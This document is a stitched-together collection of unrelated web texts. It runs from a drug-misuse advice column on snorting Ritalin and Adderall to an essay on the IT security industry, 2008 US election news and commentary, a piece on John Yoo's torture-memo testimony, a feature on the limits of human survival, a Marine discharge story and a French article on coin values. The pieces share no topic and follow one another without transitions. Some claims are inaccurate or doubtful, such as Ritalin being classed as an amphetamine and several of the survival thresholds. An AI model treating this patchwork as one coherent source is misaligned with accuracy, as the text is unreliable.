Here 's a Q&A from GoAskAlice ( http://www.goaskalice.columbia.edu/3703.html ) that explains , in more detail , the ways in which Ritalin and Adderall are , in fact , dangerous street drugs : Dear Alice , Recently I have started snorting Ritalin and Adderall ( not at the same time though ) .
I have found that the effects closely resemble that of snorting cocaine , but are not quite as intense .
I really like doing this , because it 's much cheaper than buying coke .
However , I was wondering exactly how dangerous this might be , if even at all , considering it 's a prescribed drug and I never snort more than the average dose that you would take orally .
If you could tell me what the danger in doing this is and what I might possibly be doing to my body , that would be great .
Thanks , Adderall Addict ( Alice answers :) Dear Adderall Addict , Ritalin and Adderall are two of the most prevalent prescription drugs used in the treatment of Attention Deficit Hyperactivity Disorder ( ADHD ) and Attention Deficit Disorder ( ADD ) .
Both of these medications are classified as Schedule II drugs in the amphetamine class .
Even though they are stimulants , when prescribed as directed by a medical provider in standard doses for people with ADHD and ADD , these prescription drugs assist people with AD ( H ) D to sustain their attention for a longer amount of time .
This allows them to study or complete tasks at hand much more effectively minus the feelings associated with the medications ' " speed - like " effects .
Schedule II drugs , such as Ritalin and Adderall , however , have a high propensity for misuse , abuse , and dependence .
Widely prescribed for school - age children by medical professionals , many adolescents and young adults snort Ritalin and Adderall as they believe that they are safe alternatives to cocaine .
This could not be further from the truth .
First , both the potency of Ritalin and Adderall exponentially increase when they are snorted or injected because they enter the bloodstream directly .
Second , prescription medications , especially when they are not prescribed for the user , as with illicit drugs , do not diminish their potential for harm .
These actions make the misuse / abuses of these substances as or more harmful than cocaine , since the user may believe snorting Adderall and Ritalin is safe .
Dangerous side effects from inhaling Ritalin and Adderall include : • respiratory problems , such as destruction of the nasal and sinus cavities and lung tissue• irregular heartbeat ( heart arrhythmia ) • problems with circulation• psychotic episodes• increased aggression• toxic shock• death , in extreme cases [ emphasis added ] .
If someone misuses / abuses Ritalin , Adderall , or both , help is necessary to stop using , not only to prevent further harm , but also to keep the person safe during withdrawal .
Once one has become addicted to these substances , stopping could cause withdrawal symptoms similar to those with cocaine , such as : • severe depression• psychosis• restlessness • extreme feelings of agitation
You may think that you are safer and more frugal by snorting Ritalin and Adderall , rather than cocaine , but you are harming yourself in similar ways .
You also run the risk of arrest for having and using these substances without a prescription .

The Death of the Security Industry
The hardest thing about working in IT security is convincing users to buy our technologies .
An enormous amount of energy has been focused on this problem — risk analyses , ROI models , audits — yet critical technologies still remain uninstalled and important networks remain insecure .
I ’m constantly asked how to solve this by frustrated security vendors and — sadly — I have no good answer .
But I know the problem is temporary : in the long run , the information security industry as we know it will disappear .
The entire IT security industry is an accident : an artifact of how the computer industry developed .
Computers are hard to use , and you need an IT department staffed with experts to make it work .
Contrast this with other mature high - tech products such as those for power and lighting , heating and air conditioning , automobiles and airplanes .
No company has an automotive - technology department , filled with car geeks to install the latest engine mods and help users recover from the inevitable crashes .
IT is heading in that direction : as IT becomes more of a utility , users are buying more services than products .
And by their nature , services are more about results than technologies .
Service customers — from home users to multinational corporations — care less about the technological specifics and just expect IT to work .
Eight years ago , I formed Counterpane Internet Security on the premise that large IT departments do n’t really want to deal with network security .
They want to fly airplanes , produce pharmaceuticals , manage financial accounts , or just focus on their core business .
Counterpane provided an array of services that took day - to - day security out of our customers ’ hands , including : security monitoring , security - device management , incident response .
Security was something our customers purchased , but they were looking for results , not details .
Last year BT bought Counterpane and embedded our network security services into its IT infrastructure .
BT has customers that do n’t want to deal with network management at all ; they just want the network to work .
They want the Internet to be like a phone network , a power grid , or a water system — in short , they want it to be a utility .
For these customers , security is n’t even something they purchase :
it ’s one small part of a larger IT services deal .
IBM bought ISS for the same reason : to have a more integrated solution to sell its customers .
Already , a small percentage of corporations outsource their corporate email to companies like Google .
If you have a new email security solution , convincing Google to embed it in its email service is far more efficient than trying to sell it to users .
This is where the IT industry is headed , and when it gets there , there ’ll be no point in user conferences like InfoSec and RSA .
They wo n’t disappear ; they ’ll simply become industry conferences .
If you want to measure progress , look at the demographics of these conferences .
A shift toward infrastructure - geared attendees is a measure of success .
Of course , security products wo n’t disappear .
There will still be firewalls , antivirus software , and all sorts of new technologies and products .
But users wo n’t care about them .
Instead , the new technologies will be embedded within the services sold by large IT outsourcing companies like BT , EDS , and IBM , or ISPs like EarthLink and Comcast — just like new automotive technologies are marketed to automobile manufacturers , rather than individual car owners .
This is progress .
IT security is critical , but there ’s no earthly reason why users need to know what an intrusion detection system with stateful protocol analysis is , or why it ’s helpful in spotting SQL injection attacks .
As IT fades into the background and becomes just another utility , users will simply expect it to work .
The details of how it works wo n’t matter .

Go to the link .
There is no story on this .
Some people just take an anonymous posters word for this without checking facts .
Just like the Obama supporters who wo n't take the time to read up and investigate his background associations .
THIS STORY IS NOT TRUE .
It is a complete fabrication .
John McCain is not that naive .
WASHINGTON ( Reuters ) - The New York Times on Thursday endorsed Democratic Sen. Hillary Clinton and Republican Sen. John McCain for their party ’s nominations to contest the U.S. presidential election in November .
In selecting Clinton , a New York senator , the influential newspaper ’s editorial board said her experience gave her an advantage over her chief rival in the Democratic race , Illinois Sen.
Barack Obama , though on the major issues they were not that different .
“ Hearing her talk about the presidency , her policies and answers for America ’s big problems , we are hugely impressed by the depth of her knowledge , by the force of her intellect and by the breadth of , yes , her experience , ” the newspaper said .
During her years in the Senate , Clinton has immersed herself in national security issues and has won the respect of world leaders and many in the American military , the newspaper said , adding that she would be a strong commander in chief .
Clinton is embroiled in a tight nomination battle with Obama , who would be the first African American president if elected .
Former North Carolina Sen. John Edwards has been running in third place .
The newspaper urged Clinton to take the lead in changing the tone of the campaign , in which the Obama and Clinton camps have been trading harsh accusations in a bitter public fight .
“ It is not good for the country , the Democratic Party or for Mrs. Clinton , who is often tagged as divisive , ” the newspaper said .
In backing McCain , the Times editorial board said it had strong disagreements with all the Republicans running for the presidency , but among them the Arizona senator was an easy choice .
McCain ’s chief rivals for the Republican nomination are former Massachusetts Gov. Mitt Romney , former New York mayor Rudy Giuliani and former Arkansas governor Mike Huckabee .
“ Senator John McCain of Arizona is the only Republican who promises to end the George Bush style of governing from and on behalf of a small , angry fringe .
With a record of working across the aisle to develop sound bipartisan legislation , he would offer a choice to a broader range of Americans than the rest of the Republican field , ” the newspaper said .
The Times said McCain has shown he has the character to stand on principle , that he was an early advocate for battling global warming and he was one of the first prominent Republicans to point out how badly the war in Iraq was being managed .
” A genuine war hero among Republicans who proclaim their zeal to be commander in chief , Mr. McCain argues passionately that a country ’s treatment of prisoners in the worst of times says a great deal about its character , ” the newspaper said .
The New York paper said it could not endorse Giuliani , describing the city ’s former mayor as a “ narrow , obsessively secretive , vindictive man ” whose “ arrogance and bad judgment are breathtaking . ”
Giuliani brushed off the paper ’s portrayal when asked about it during a Republican debate in Boca Raton , Florida .
“ I think there are some serious ideological differences , ” Guiliani said .
“ That probably was some of the nicest language they ’ve written about me in the last six months . ”
MADRID ( Reuters ) - A procession of devils , ghosts and zombies through the historic Spanish city of Toledo has been branded blasphemous by the Catholic Church .
Actors from the Morboria theatre company performed a representation inspired by the medieval Dance of Death in Toledo ’s streets on Saturday , provoking an angry reaction from the cathedral pulpit the following day .
“ We ask forgiveness for those who yesterday insulted the body of Christ , ” said Archbishop Antonio Canizares , quoted in newspaper El Pais .
He told worshippers the procession , which also included a Virgin Mary and a Saint Peter , made a mockery of the Catholic celebration of Corpus Christi .
“ This feast and all it means are much bigger than this belittling and rolling about on the streets , ” Canizares said .
A representative of Morboria said the actors had been well received by most passers by except for one small group who told them off and said they would pray for them .
“ We were hired by the town hall , ” said Morboria ’s Eva de Palacio .
Long one of Europe ’s most traditionalist countries , Spanish society has become one of its most socially liberal since the death of dictator Francisco Franco in 1975 .
The Socialist government of Prime Minister Jose Luis Rodriguez Zapatero has angered the Church by legalizing gay marriage , making divorce easier , and reducing the Catholic influence over education .
Toledo retains a reputation as one of the most conservative towns in Spain .
It was once home to a permanent office of the Spanish Inquisition , which had more painful methods of dealing with blasphemy than those available to Canizares .
WASHINGTON ( CNN ) --
The general election season opens with a neck - and - neck race between Barack Obama and John McCain , with more than one in five voters acknowledging that they might change their minds between now and November .
In the CNN / Opinion Research Corporation poll , the first conducted entirely after Obama became the presumptive Democratic nominee , he leads his Republican counterpart 49 percent to 46 percent among registered voters -- a statistical tie , given the question 's 3 - point margin of error .
McCain and Obama are n't alone .
Independent candidate Ralph Nader and Republican - turned - Libertarian Bob Barr are vying with the two major - party candidates for independent voters .
But at this point , it looks unlikely either will play a spoiler role :
When pollsters asked about a field of candidates that includes Nader and Barr , the margin between Obama and McCain was virtually unchanged , with the Illinois senator leading 47 percent to 43 percent .
Nader pulls in 6 percent and Barr 2 .
What would Hillary Clinton bring to a Democratic ticket ?
Answer : About 3 percentage points .
A hypothetical Obama - Clinton ticket would currently get 52 percent of the vote , compared with 46 percent for a hypothetical McCain - Romney ticket , according to the poll .
If Clinton is not on the ticket , 60 percent of her Democratic supporters said they would vote for Obama , 17 percent would vote for McCain , and 22 percent would stay at home in November and not vote for anyone .
Watch Obama plan his second presidential term »
" That 's just one estimate of the ' Clinton factor , ' " said CNN polling director Keating Holland , " and it may not be an accurate predictor since it piles several hypotheticals on top of each other and asks people to guess their state of mind five months from now .
" Nonetheless , it does indicate that unmotivated Clinton supporters may be a bigger risk to Obama than defections from the Clinton camp to McCain . "
The results are based on interviews with 1,035 adult Americans , including 921 registered voters , conducted by telephone Wednesday and Thursday .

Defending the President as Tyrant All over the world down through history , political leaders who have engaged in torture and other grotesque crimes of state have justified their actions as necessary to protect their governments or their people or themselves .

It was true when England ’s King Edward I had William Wallace – “ Braveheart ” – drawn and quartered in 1305 for resisting the crown ’s rule in Scotland , and a gruesome death was what King George III foresaw for America ’s Founding Fathers in 1776 when they stood up to his abuses in the Colonies .
Kings and tyrants often inflicted special pain on people they viewed as challenging their authority and – at such times – they wiped away the rules of justice .
But the United States was supposed to be different .
Indeed , reaction to tyrannical monarchs was what compelled the Founders to establish a government of laws , not men , based on “ unalienable rights ” for all mankind , including protection against arbitrary detention and prohibition of “ cruel and unusual punishment . ”
Which is why it was stunning to watch the June 26 hearing before the House Judiciary subcommittee on the Constitution as two representatives of George W. Bush ’s presidency responded with disdain when pressed on the administration ’s extraordinary vision of an all - powerful Executive operating without legal limits .
While Vice President Dick Cheney ’s chief of staff David Addington treated the committee Democrats with haughty contempt , former State Department lawyer John
Yoo expressed the ultimate arrogance of power with his muddled responses and evasions of direct questions .
The soft - spoken Yoo , who authored some of the key legal opinions justifying the abuse of detainees , would n’t even give a clear answer to the simple question of what atrocity might be beyond President Bush ’s power to inflict .
Rep. John Conyers , D - Michigan , cited a news report quoting an ambiguous response from Yoo , who is now a law professor at the University of California at Berkeley , about whether the President could torture the child of a “ war on terror ” suspect to induce the suspect to talk .
The Judiciary Committee chairman asked : “ Is there anything , Professor Yoo , the President cannot order to be done to a suspect if he believes it ’s necessary for national defense ? ”
When Yoo dissembled , Conyers posed the question more pointedly : “ Could the President order a suspect buried alive ? ”
Yoo continued to fence with the congressman , avoiding a direct answer .
“ I do n’t think I ever gave advice that the President could bury somebody alive , ” Yoo said , adding he believed that “ no American President would ever have to order that or feel it necessary to order that . ”
Pointedly , however , Yoo avoided a direct response to the question of whether he believed the President had the authority to do it .
Pulling Fingernails Later in the hearing , Rep. Steve Cohen , D - Tennessee , returned to the administration ’s legal theories that Bush holds “ plenary ” – or unlimited – power at a time of war and that the President ’s motivation , i.e. protecting the country , justifies taking extreme actions .
“ So , if I want to take somebody ’s fingernails out if I think it ’s for the good of the country , that ’s not torture ? ”
Cohen asked .
“ If I want to cut someone ’s appendage off , it ’s okay as long as I think it ’s important for the country ? …
“ Is there anything you think the President cannot order in terms of interrogation of these prisoners in a state of war ? ”
Again , dodging a direct answer , Yoo responded that those examples “ are not addressed in these memos . …
I would say there are things I do n’t think any American President would order in order to protect the national security and one of those things is the torture of detainees . ”
At this point , Rep. Jerrold Nadler , D - New York , subcommittee chairman , interrupted : “ This is the second time today … that you ’ve said that you do n’t believe an American President would order certain heinous acts .
Would you answer the question , not would he order it , but could he order it under the law in your opinion ? ”
Yoo responded , “ It ’s not fair to ask that question without any kind of facts , ” prompting Nadler to rephrase the question again : “ There ’s nothing conceivable to which you could answer ‘ no ’ that an American President could not order this without knowing facts and context ? ”
Yoo : “ I ca n’t agree with that because you are trying to put words in my mouth attempting to get me to answer some broad question covering all circumstances and I ca n’t do that . ”
Though refusing to answer , Yoo reaffirmed – through his circumlocution – what has been a central tenet of Bush ’s view of presidential power , that there are no limits to his power for the duration of the “ war on terror , ” even though it is a vague conflict that has no definable end and that is fought on a global battlefield including U.S. territory .
In other words , it is the opinion of the right - wing lawyers who have constructed this legal theory that Bush truly can do whatever he wants to whomever he wants anywhere in the world as long as he couches his actions under his Commander - in - Chief authority .
And when it comes to torture , other word games come into play , such as categorizing “ waterboarding , ” a form of simulated drowning that has been regarded as torture for centuries , as something other than torture .
Reality is all in the eye of the all - powerful President .
Though this right - wing concept of unlimited presidential power appeals to some Americans who consider their personal safety more important than the Constitution and the Bill of Rights , it is so radical a break with American traditions that even its chief advocates , such as Yoo and Addington , duck and weave when the questions are presented directly .
Election 2008
This theory of an all - powerful President now is at stake in Election 2008 , as was made clear after the Supreme Court ruled , 5 - 4 , on June 12 that the administration could n’t deny habeas corpus rights to detainees at the U.S. Naval Base at Guantanamo Bay , Cuba , some of whom have been held as long as six years .
In his dissent , right - wing Justice Antonin Scalia not only challenged the majority ’s legal arguments but pushed the emotional hot button that by recognizing this ancient right for challenging a government ’s power to imprison someone , the Supreme Court was putting Americans in danger .
The ruling , Scalia said , “ will almost certainly cause more Americans to be killed . ”
Three other right - wing justices – Clarence Thomas , John Roberts and Samuel Alito – concurred in Scalia ’s dissent .
Reacting to the Supreme Court , Republican presidential candidate John McCain backed the right - wing minority and called the majority 's ruling “ one of the worst decisions in the history of this country . ”
By contrast , Democratic presidential candidate Barack Obama sided with the majority , calling habeas rights for detainees “ an important step toward reestablishing our credibility as a nation committed to the rule of law . ”
If elected , McCain has vowed to appoint more justices like Roberts and Alito – George W. Bush ’s choices – meaning that if a President McCain gets to replace one of the five majority justices , the new court might well reinterpret the Constitution to legalize an all - powerful President who can act much like ancient kings once did .
Then , if a President thinks that it might be a good idea to torture someone ’s child or bury somebody alive , the questions about the limits of his authority might not be hypothetical anymore .

Brrr : Feeling cold ?
How cold can you get ?
Normal body temperature varies between individuals but is typically just over 37C .
Should this drop by even a small amount , then hypothermia sets in .
At 36C , reaction times and judgment become impaired .
At 35 C you will be unable to write your own name and even walking is very difficult .
At 33 C you may become completely irrational , throwing away survival gear and stripping off your clothing .
At 32C , most people will collapse , becoming unconscious when their core temperature drops to around 30C .
At this point the body has given up trying to maintain core temperature .
Breathing drops to just one or two breaths a minute .
By 28C , cardiac arrhythmia ( an irregular heartbeat ) sets in and by the time you have cooled to 20C , your heart will have stopped beating altogether .
However , doctors have a saying : " You are n't dead until you are warm and dead . "
This is because extreme cold slows the cellular breakdown that causes irreversible damage .
You can improve your chances of survival by being warmed up very gently and having paramedics on hand with a defibrillator .
It helps if you 're young , too , because children 's organs are more resilient .
The theoretical absolute lower limit , however , is zero degrees centigrade .
At this temperature , ice crystals would form in your tissues , destroying all cells .
Theoretical limit : 0C
Current record : 16C
In 2001 , a toddler was revived after wandering out in - 20C weather .
Her heart had stopped for two hours and her core temperature was 16C .
Punchbag : Sylvester Stallone as Rocky Balboa
The human punchbag
Muscle tissue generates about 0.3 micronewtons of force per muscle fibre .
This translates into about 100 Newtons ( roughly 10kg ) for each square centimetre of cross-sectional area in your muscle .
But the bones in your forearm will shatter above 200 megapascals of compression , roughly equivalent to 50 kilonewtons ( 1 kN = 1,000 Newtons ) of force .
If we assume that the arm muscles contribute half of the force of the punch ( with the rest coming from the legs , hips and shoulder acting in concert ) , you would need a tricep with a circumference of around 55 cm to reach this limit , as well as lots of training to maximise the efficiency of your technique .
Theoretical limit : 50kN
Current record : 3 kN ( estimated )
In 1931 boxer Max Baer landed what 's regarded as the hardest punch ever - in a fight with Ernie Schaff , who never fully recovered and died six months on .
How much blood can you lose - and live ?
A healthy adult has between 3.8 and 5.6 litres of blood .
You can lose up to 15 per cent of your total volume rapidly without any immediate effects .
Above this , your pulse will become more rapid and you may feel dizzy , irritable or cold .
At around 40 per cent loss , your blood pressure is too low to refill the heart chambers and the heart goes into ventricular tachycardia ( a fast rhythm that can be fatal ) .
Good cardiovascular fitness improves your chances of survival - and it also helps to be large , as you can lose a greater volume for the same percentage loss .
Lying still and keeping calm will also delay the onset of shock by reducing adrenalin levels .
Theoretical limit : 1.9 -2.8 litres , 50 per cent
Current record : 75 per cent
In 1987 , cancer patient Melissa Koslosky was found with just 0.9 litres ( 25 per cent ) of blood in her system .
But the blood was lost slowly over weeks .
How much water can you drink in an hour ?
Ten litres : the most water you can drink in an hour without diluting your electrolyte levels , resulting in seizure or death .
What is the hottest curry you can bear to eat ?
Some like it hot : Prawn curry
The active ingredient in curry or chilli is capsaicin .
The more capsaicin present , the hotter the curry .
Ordinary Tabasco sauce is about 260 parts per million capsaicin .
A habanero chilli contains about 17,000 ppm .
Theoretically , the hottest curry you could make would be a bowl of pure capsaicin crystals .
This dish would be 10,000 times hotter than a vindaloo .
Although capsaicin does not actually cause a chemical burn or any direct tissue damage itself , the impact on the nervous system of such powerful stimulation is similar to an allergic reaction .
As well as incredible pain , you could expect uncontrollably streaming eyes and nose , upper body spasms , and severe difficulty breathing for 30 to 45 minutes .
In fact , our ultimate curry would be five times stronger than the pepper spray used by police for riot control .
Provided you are healthy with no history of heart conditions or asthma , it might be possible to survive a teaspoon of pure capsaicin , but impossible to eat anything else for a few hours .
Theoretical limit : 5g capsaicin
Current record : 0.1g
In 2005 , Blair Lazar refined 500g of capsaicin from chilli peppers to create a sauce .
He tried a single crystal .
" It was like having your tongue hit with a hammer , " he said .

How many balls can you juggle ?
Only a handful of people have ever managed to juggle 11 or 12 balls and no one has done 13 .
The problem is that the more balls are in the air at once , the faster your hands need to move to keep them up .
A 1997 study using accelerometers attached to the hands of some of the best jugglers in the world showed that - with perfect technique - it might be possible to juggle 16 balls at once .
But for this to happen , every ball would have to be thrown to exactly the same height and land in exactly the same location .
How fast can your legs carry you ?
The question of how fast it is possible for a human to run is more complicated than it sounds .
Even deciding who is today 's fastest human is tricky .
The current world record for the 100 m sprint is held by Asafa Powell of Jamaica , who clocked a time of 9.74 seconds in 2007 .
This gives an average speed of 36.96 km /h , but since the runners must begin from a standstill , this includes the time taken to accelerate .
Sprinters in a 200 m race will complete their second 100 m in a shorter time than the first because they are already running at full speed as they cross the 100 m mark .
Since the advent of electronic timing in 1968 , the men's world record for the 100 m has been beaten 11 times ( but never by more than 0.05 seconds ) .
Improvements in track and running shoe technology or the effects of wind and altitude are the most likely causes of this .
Most of the forward force in a running stride is supplied by the quadricep muscles .
These are attached to the knee by the quadriceps tendon .
Work done by Dr Gideon B. Ariel in the 1970s suggested that any time faster than 9.60 seconds would require forces high enough to rupture this tendon from its attachment point .
Taking this as the fastest possible time for the 100 m would give an average speed 37.5 km / h .
Top sprinters peak around the 80 m mark .
Taking this as a guide , it 's possible to estimate a runner 's maximum speed as 11.96 m / s or 43.06 km /h .
Theoretical limit : 43.06km/h
Current record : 42.52km /h
In 2007 , Asafa Powell ran with a 1.7m / sec tailwind .
Despite this , he only improved on the record by 0.05 seconds .
How many bee stings can you survive ?
2243 : the greatest number of bee stings ever survived .
600 : the theoretical dose needed to give a 50 per cent chance of death .
HIs Master 's Voice :
That 's loud , man
How loud is too loud ?
Sound volume is measured in decibels , a dimensionless , logarithmic scale where an increase of 3 dB corresponds to a doubling in power .
At 125 dB ( a jet taking off 50 metres away ) , sound becomes painfully loud .
The loudest sound you can safely hear is 160 dB because above that there is a chance your eardrums will rupture .
But sound is just a pressure wave and there is almost no theoretical upper limit to its intensity .
The existence of a " brown note " , that resonates to cause victims to lose control of their bowels , has been postulated but never demonstrated in tests .
But internal organ damage from very loud sounds is perfectly possible .
The loudest sound ever recorded was the eruption of Krakatoa in 1883 , which measured 180dB , 160 km away .
Anyone closer than 20 km would have experienced sound levels of 200dB and , at this volume , the pressure wave would rupture their lungs and force air into the bloodstream , causing a fatal pulmonary embolism .
Theoretical limit : 200dB
Current record : 175 dB at 2m
The T - 429 stun grenade produces a 175 dB bang at 2 metres .
At point blank range , this would rise to 186dB , which is enough to trigger cardiac arrest .
What 's the biggest electric shock you can take ?
In classic electrocution , the heart is shocked out of its beating rhythm in a process called ventricular fibrillation .
It 's not voltage that kills but electrical current , measured in amps .
The threshold of sensation for humans is one milliamp ( 1 mA ) , while a sustained current of 200 mA is fatal - able to stop a typical human heart weighing around 300g .
According to Ohm's Law , current passing through a conductor is given by voltage divided by electrical resistance , measured in ohms .
The resistance of human skin varies between 1,000 ohms ( wet skin ) to 100,000 ( dry ) , so the lethal voltages are 200V and 20,000V respectively .
A 400g heart ( the most a healthy heart can weigh ) might take up to 27,000V .
At high voltages , extra physics comes into play .
For example , only ten per cent of lightning strikes are fatal .
Most injuries result from arc flash - the intense heat , light and pressure from the sudden heating effect of electrical currents .
Theoretical limit : 27,000V
Current record : n/
a
U.S. PARK Ranger Roy Sullivan survived seven lightning strikes between 1942 and 1977 .
How hard can you get struck by a car and live ?
At 30 mph , the chance of surviving a car crash falls to 27 per cent .
At speeds above 38 mph , you have less than a 1 per cent chance of surviving .
HONOLULU — A Marine from Monroe is being tossed out of the service as punishment for his role in a video that showed him throwing a puppy off a cliff in Iraq , the U.S. Marine Corps reported Wednesday evening .
Lance Cpl. David Motari , 22 , of Monroe , a veteran of combat in Iraq and Afghanistan , is being discharged from the Marine Corps as a result of an investigation into the incident , Maj. Chris Perrine of Marine Corps Base Hawaii said .
Motari ’s unit , based in Hawaii , is currently training for redeployment in Iraq this fall .
The 17 - second video showing Motari throwing the puppy spread widely on the Internet beginning March 3 and led to international headlines and death threats against his family in Monroe .
Reached at her home Wednesday , Motari ’s mother declined comment .
Monroe Mayor Donnetta
Walser said it would be wrong to let the video define Motari ’s character .
“ You never know how young men will react in a war zone , ” Walser said .
“ It ’s unfortunate that this overshadows what he ’s done in serving our country . ”
Likewise , Motari ’s conduct should not tarnish Monroe ’s reputation , the mayor said .
“ It ’s really unfortunate , ” she said .
“ I still have concerns for his family and friends here . ”
While careful not to publicly confirm Motari ’s identity as the person who threw the dog for the last three months , the Marine Corps on Wednesday not only named him , but also deplored his conduct .
“ The Marine Corps conducted a thorough investigation as soon as it learned of the event and acted as swiftly as possible , ” a statement said .
“ The actions seen in the Internet video are contrary to the high standards we expect of every Marine and will not be tolerated .
The vast majority of Marines conduct their duties with honor and compassion that makes American people proud . ”
The video was broadcast on CNN ; Fox News ; MSNBC ; and Aljazeera.com , a news Web site based in Dubai , United Arab Emirates .
Countless people posted their opinions about the video online .
Internet - fueled rage quickly turned to death threats against the Marine ’s family .
Many even called his mother ’s workplace in Monroe , demanding that she be fired .
It ’s people stateside who send young servicemen and women to war , Monroe City Councilman Mitch Ruth said .
“ As unfortunate as this incident is , I still find it troublesome that there was far more outcry for this puppy than the fact that … this Marine , was sent to war in another country , ” Ruth said .
The controversy highlighted a new and growing problem for the U.S. military .
Young tech - savvy warriors who head into combat zones abroad have begun posting raw , disturbing images on the Internet , without knowing how easily they can stir outrage or hurt others , including loved ones in the states .
The military is scrambling to control the risk .
Motari has received a nonjudicial form of punishment and is currently being processed for separation from the Marine Corps for his role in the video .
Results of nonjudicial punishments and the type of discharge received cannot be released under the Privacy Act .
One other Marine has been disciplined as a result of the video .
Sergeant Crismarvin Banez Encarnacion , based in San Diego , Calif. , also has received nonjudicial punishment .

Valeur des pièces de la Monnaie de Paris : rôle du Cours légal , de la valeur intrinsèque des pièce , de leur rareté , etc ...
La question " Que valent les Pièces de la Monnaie de Paris ? " est plus compliquée qu’il n’y paraît au premier abord .
Il y a quelques notions clé à comprendre ( la notion de cours légal , de valeur intrinsèque , de seigneuriage , les concepts de rareté , de prix du marché , c’est - à - dire d’offre et de demande ) .
Il faut dire d’abord que les pièces de la Monnaie de Paris , ce sont les pièces de la France .
On parle de la “ Monnaie de Paris ” car c’est dans les locaux de Paris , Quai Conti , qu’est située l’administration centrale qui gère la fabrication des pièces .
Mais concrètement les pièces ne sont pas fabriquées à Paris mais dans l’usine de Pessac , à côté de Bordeaux depuis 1973 .
La Monnaie de Paris dispose du monopole légal de la fabrication de pièces de monnaie en France .
Les pièces fabriquées par la Monnaie de Paris sont les pièces officielles de la France
Toutes les pièces de la Monnaie de Paris ont une valeur faciale , c’est - à- dire une valeur inscrite sur une de leurs faces .
La valeur faciale la plus basse est de 1 centime et la plus haute est de … 5000 euro !
A la question “ que valent les pièces de la Monnaie de Paris ” on peut donc déjà répondre ceci : les pièces de la Monnaie de Paris valent au moins la valeur qui est inscrite sur une de leurs faces .
Ces pièces ont cours légal aussi longtemps que les autorités le veulent .
Cela signifie que l’on peut s’en servir pour payer .
On parle du “ pouvoir libératoire de la monnaie ” .
Les commerçants ont l’obligation d’accepter les pièces ayant cours légal , y compris les pièces de collection sous peine d’une amende de 150 euro .
Cependant les pièces de collection de la Monnaie de Paris n’ont pas pour but d’être utilisées pour les paiements courants .
Et même si le droit vous y autorise , le bon sens devrait vous inciter à ne pas entrer en conflit avec un commerçant qui refuse une pièce de collection comme moyen de paiement .
Passé un certain temps ou pour diverses autres raisons , les pièces peuvent être “ démonétisées ” .
Dans ce cas elles n’ont plus cours légal et on ne peut donc plus s’en servir pour payer .
Avec le passage à l'euro , les pièces de monnaie en franc ne sont plus utilisables pour les paiements depuis le 17 février 2002 , et ne sont plus échangées par la Banque de France depuis le 17 février 2005 .
Elles sont démonétisées .
A contrario toutes les pièces libellées en euro et fabriquées par la Monnaie de Paris depuis 1999 ont toujours cours légal .
Des pièces destinées à la circulation courante et d'autres destinées aux collectionneurs
On peut diviser les pièces de la Monnaie de Paris en 2 grandes catégories : les pièces destinées à la circulation courante et les pièces de collection .
Les pièces destinées à la circulation courante sont au nombre de 8 : 1 centime , 2 centimes , 5 centimes , 10 centimes , 20 centimes , 50 centimes , 1 euro et 2 euro .
Ces pièces peuvent se vendre plus cher que leur valeur faciale dans certains cas .
C’est le cas pour les pièces fautées , c’est - à- dire qui comportent des erreurs de fabrication .
Mais on ne peut pas dire qu’il existe un marché dynamique pour ce genre de pièces qui peuvent être rares , certes , mais qui ne se vendent jamais pour les sommes astronomiques qu’en demandent certains vendeurs .
Il peut également arriver que les collectionneurs internationaux de pièces de monnaie en euro soient prêts à payer plus cher des pièces françaises destinées à la circulation courante .
Mais les collectionneurs cherchent généralement des pièces neuves ou en excellent état .
Ils préfèrent souvent acheter des pièces en état neuf vendues directement par les instituts monétaires de chaque pays .
Les pièces de 2 euro " commémoratives circulantes " sont les pièces en euro les plus collectionnées
Parmi les pièces destinées à la circulation courante se trouve une catégorie particulière , les pièces dites “ commémorative circulantes ” .
A partir de l’année 2004 les pays membres de la zone euro ont eu le droit de fabriquer chaque année une pièce commémorative de 2 euro par an .
Ces pièces conservent toujours l’avers normal des pièces circulantes mais un motif national spécial est gravé au revers .
Ces pièces circulent et ont cours légal dans l’ensemble de la zone euro .
Depuis 2012 les Etats ont eu l’autorisation de fabriquer jusqu’à 2 pièces de 2 euro commémoratives circulantes chaque année .
Les pièces de 2 euro commémoratives sont de loin les pièces en euro les plus collectionnées en France , en Europe et même dans le monde .
Les collectionneurs découvrent souvent ces pièces dans leur porte - monnaie par hasard et ils les conservent .
C’est ainsi que naissent nombre de collections .
Ils commencent une collection après avoir trouvé des pièces spéciales dans leur porte - monnaie ...
Il existe un marché actif pour les pièces de 2 euro commémoratives , qui se négocient souvent pour 3 à 5 euro pour les pièces les plus courantes ( car les collectionneurs qui veulent compléter rapidement une série de pièces n’ont souvent pas d’autre choix que de les acheter ) .
Généralement ces pièces ne sont pas très rares .
Par exemple la pièce de 2 euro française Charles de Gaulle 2020 a été tirée à plus de 18 millions d’exemplaires .
Au contraire , certaines pièces de 2 euro sont très rares .
C’est le cas par exemple de la pièce de 2 euro Grace Kelly de Monaco frappée en 2007 à seulement 20001 exemplaires .
Ces pièces peuvent se vendre jusqu’à 2500 ou 2700 euro .
La plupart des pièces de 2 euro ne sont pas rares , sauf exception ...
En plus des pièces destinées à la circulation courante , la Monnaie de Paris produit chaque année une large gamme de pièces de collection .
Ces pièces , comme nous l’avons vu , ont cours légal , mais ne sont pas destinées à la circulation courante .
Elles ont cours légal exclusivement en France .
Elles sont fabriquées pour un public de collectionneurs .
Parmi l’abondante production de la Monnaie de Paris se trouvent des pièces de différentes formes , de différents poids et de différents métaux représentant une multitude de thématiques destinées à toucher un public le plus large possible , du plus populaire au plus élitiste .
La Monnaie de Paris fabrique des pièces métal ordinaire et des pièces en or et en argent
La Monnaie de Paris produit des pièces en métal courant ( cuivre et nickel ) mais aussi des pièces en or et en argent .
Si les pièces en métal courant n’ont pas de valeur intrinsèque particulière , il n’en va pas de même pour les pièces en or et en argent qui ont une valeur faciale déterminée et une valeur métallique intrinsèque propre : si on faisait fondre ces pièces ont pourrait vendre le métal précieux qu’elles contiennent au cours du jour .
Le prix de vente des pièces en or ou en argent de la Monnaie de Paris est toujours supérieur à leur coût de production ( comment pourrait - il en être autrement ? ) .
Lorsqu’on calcule la valeur métallique des pièces , on constate qu’elle est souvent très inférieure à la valeur faciale ou au prix de vente des pièces .
La Monnaie de Paris use d’une sorte de droit de seigneuriage , c’est - à- dire du prélèvement d’une partie de la valeur des pièces produites ( dont elle détient le monopole ) à son profit .
C’est pourquoi les pièces d’or et d’argent de la Monnaie de Paris ont souvent l’air d’un mauvais investissement .
Mais c’est sans compter avec 2 faits : l’évolution du cours des métaux précieux et l’offre et la demande sur le marché des monnaies de collection .
